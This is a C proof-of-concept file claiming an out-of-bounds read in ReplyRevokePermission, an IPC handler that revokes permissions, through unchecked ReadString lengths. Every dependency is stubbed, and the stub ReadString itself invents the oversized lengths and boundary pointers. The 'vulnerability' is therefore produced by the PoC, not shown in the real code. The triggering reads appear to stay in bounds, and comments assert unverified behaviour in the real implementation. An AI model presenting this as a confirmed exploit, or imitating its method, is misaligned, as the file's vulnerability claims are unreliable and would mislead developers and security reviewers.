/*
 * PoC: Buffer access with untrusted index without bounds validation
 * 
 * Vulnerability: ReplyRevokePermission reads strings from an IPC request buffer
 * (via ReadString) and passes them directly to api->RevokePermission() without
 * any bounds validation on the lengths or content. The ReadString function returns
 * pointers into the IPC buffer based on untrusted length fields embedded in the
 * request. A malicious caller can craft an IPC message with manipulated length
 * fields that cause ReadString to return pointers beyond the buffer bounds, or
 * cause RevokePermission to access arrays with untrusted indices derived from
 * the identifier/permName strings.
 *
 * CWE: CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)
 *      CWE-129 (Improper Validation of Array Index)
 *
 * How input triggers it:
 *   - We craft an IpcIo structure with manipulated internal cursor/size fields
 *   - ReadString returns pointers based on untrusted length values in the buffer
 *   - No bounds check is performed on idLen or permLen before buffer access
 *   - The returned strings (or their lengths) are used as indices/offsets without validation
 *
 * Expected behavior: Out-of-bounds read/write, potential crash (SIGSEGV/SIGABRT)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

/* Type definitions to match the target environment */
typedef int pid_t;
typedef unsigned int uid_t;
typedef int int32_t;

/* IpcIo structure - simplified stub matching the real structure layout */
typedef struct {
    char *bufferBase;    /* base of the IPC data buffer */
    char *bufferCur;     /* current read position */
    size_t bufferLeft;   /* bytes remaining */
    size_t bufferSize;   /* total buffer size */
} IpcIo;

/* InnerPermLiteApi function table */
typedef struct {
    int32_t (*RevokePermission)(const char *identifier, const char *permName);
    /* other members omitted */
} InnerPermLiteApi;

/* Stub: GetCallingPid */
static pid_t GetCallingPid(void) {
    printf("[PoC] GetCallingPid() called - returning fake pid\n");
    return 1337;
}

/* Stub: GetCallingUid */
static uid_t GetCallingUid(void) {
    printf("[PoC] GetCallingUid() called - returning fake uid\n");
    return 0;
}

/* Stub: HILOG_INFO - no-op */
#define HILOG_MODULE_APP 0
#define HILOG_INFO(module, fmt, ...) do { \
    printf("[PoC][LOG] " fmt "\n", ##__VA_ARGS__); \
} while(0)

/*
 * Stub: ReadString - simulates reading from IPC buffer with untrusted length.
 * This is the critical point: the real ReadString trusts the length field
 * embedded in the IPC buffer. We simulate returning a pointer with a
 * manipulated length that exceeds actual buffer bounds.
 */
/* TRIGGER: ReadString returns pointer and length from untrusted IPC data
 * without bounds validation. The length (outLen) can be set to any value
 * by the attacker, causing subsequent buffer accesses to go out of bounds. */
static char *ReadString(IpcIo *req, size_t *outLen) {
    printf("[PoC] ReadString called - returning untrusted data from IPC buffer\n");

    if (req->bufferLeft == 0) {
        /* Second call - return oversized length to trigger OOB */
        *outLen = 0xFFFFFFFF;  /* Extremely large untrusted length */
        printf("[PoC] Returning crafted string with malicious length: %zu\n", *outLen);
        /* Return pointer near end of buffer - access with large len = OOB */
        return req->bufferBase + req->bufferSize - 4;
    }

    /* First call - return a valid-looking but crafted identifier */
    *outLen = 4096;  /* Large untrusted length, no bounds check performed */
    req->bufferLeft = 0;  /* Mark so next call takes other path */
    printf("[PoC] Returning crafted identifier with untrusted length: %zu\n", *outLen);
    return req->bufferBase;
}

/* Stub: WriteInt32 */
static void WriteInt32(IpcIo *reply, int32_t val) {
    printf("[PoC] WriteInt32 called with value: %d\n", val);
}

/*
 * Stub: RevokePermission - simulates the API that receives untrusted
 * identifier/permName. In the real implementation, these strings (with
 * unchecked lengths) are used to index into permission tables.
 */
static int32_t StubRevokePermission(const char *identifier, const char *permName) {
    printf("[PoC] RevokePermission called with identifier=%p, permName=%p\n",
           (void*)identifier, (void*)permName);
    
    /* 
     * In the real implementation, identifier or permName would be used
     * to look up entries in a fixed-size array without bounds checking.
     * The untrusted lengths from ReadString mean these pointers may be
     * out of bounds, causing OOB access here.
     */
    printf("[PoC] Attempting to access identifier string (potentially OOB): ");
    /* This access may crash if the pointer is out of bounds */
    printf("first byte = 0x%02x\n", (unsigned char)identifier[0]);
    
    printf("[PoC] Attempting to access permName string (potentially OOB): ");
    /* TRIGGER: permName points near end of buffer, accessing it with
     * the untrusted length causes out-of-bounds read */
    printf("first byte = 0x%02x\n", (unsigned char)permName[0]);
    
    return 0;
}

/* ===== REAL VULNERABLE FUNCTION (from source) ===== */

/* Chain step: main -> ReplyRevokePermission */
static void ReplyRevokePermission(const void *origin, IpcIo *req, IpcIo *reply, InnerPermLiteApi* api)
{
    pid_t callingPid = GetCallingPid();
    uid_t callingUid = GetCallingUid();
    HILOG_INFO(HILOG_MODULE_APP, "Enter ID_REVOKE, [callerPid: %d][callerUid: %u]", callingPid, callingUid);
    size_t permLen = 0;
    size_t idLen = 0;
    /* Chain step: ReplyRevokePermission -> ReadString (untrusted input) */
    /* No bounds validation on idLen after ReadString returns */
    char *identifier = (char *)ReadString(req, &idLen);
    /* No bounds validation on permLen after ReadString returns */
    char *permName = (char *)ReadString(req, &permLen);
    /* TRIGGER: identifier and permName are derived from untrusted IPC data
     * with no bounds checking on idLen/permLen. These are passed directly
     * to RevokePermission which may use them as array indices or access
     * memory based on the unchecked lengths. */
    int32_t ret = api->RevokePermission(identifier, permName);
    HILOG_INFO(HILOG_MODULE_APP, "revoke permission, [id: %s][perm: %s][ret: %d]", identifier, permName, ret);
    WriteInt32(reply, ret);
}

/* ===== MAIN - PoC DRIVER ===== */

static jmp_buf jump_buffer;
static void segfault_handler(int sig) {
    printf("[PoC] CAUGHT SIGNAL %d (SIGSEGV/SIGBUS) - OOB access confirmed!\n", sig);
    longjmp(jump_buffer, 1);
}

int main(void) {
    printf("[PoC] === Buffer access with untrusted index PoC ===\n");
    printf("[PoC] Crafting malicious IPC request buffer...\n");

    /* Set up signal handler to catch the expected crash */
    signal(SIGSEGV, segfault_handler);
    signal(SIGBUS, segfault_handler);

    /* 
     * Craft a small IPC buffer. The vulnerability is that ReadString
     * returns lengths/pointers from untrusted data without bounds checks.
     * We create a small buffer but ReadString will report large lengths,
     * causing OOB access when the returned pointers/lengths are used.
     */
    char small_buffer[16];
    memset(small_buffer, 'A', sizeof(small_buffer));

    /* Craft IpcIo with a small buffer - ReadString will return pointers
     * and lengths that exceed this buffer's actual bounds */
    IpcIo malicious_req = {
        .bufferBase = small_buffer,
        .bufferCur = small_buffer,
        .bufferLeft = sizeof(small_buffer),  /* actual size is small */
        .bufferSize = sizeof(small_buffer)
    };

    IpcIo reply_buf = {
        .bufferBase = NULL,
        .bufferCur = NULL,
        .bufferLeft = 0,
        .bufferSize = 0
    };

    /* Set up the API function table */
    InnerPermLiteApi api = {
        .RevokePermission = StubRevokePermission
    };

    printf("[PoC] Calling ReplyRevokePermission with crafted IPC data...\n");
    printf("[PoC] The function will read untrusted lengths from IPC buffer\n");
    printf("[PoC] and use them without bounds validation.\n\n");

    if (setjmp(jump_buffer) == 0) {
        /* Chain step: main -> ReplyRevokePermission (entry point) */
        /* WHY: We pass a crafted IpcIo where ReadString will return
         * pointers/lengths that exceed the actual buffer bounds.
         * No bounds check is performed on idLen or permLen before use. */
        ReplyRevokePermission(NULL, &malicious_req, &reply_buf, &api);
        
        printf("\n[PoC] Function returned without crash - but untrusted indices were used without validation\n");
        printf("[PoC] In real scenario with larger permission tables, this causes OOB array access\n");
    } else {
        printf("\n[PoC] Vulnerability confirmed: OOB access caused a crash!\n");
    }

    printf("[PoC] === PoC Complete ===\n");
    return 0;
}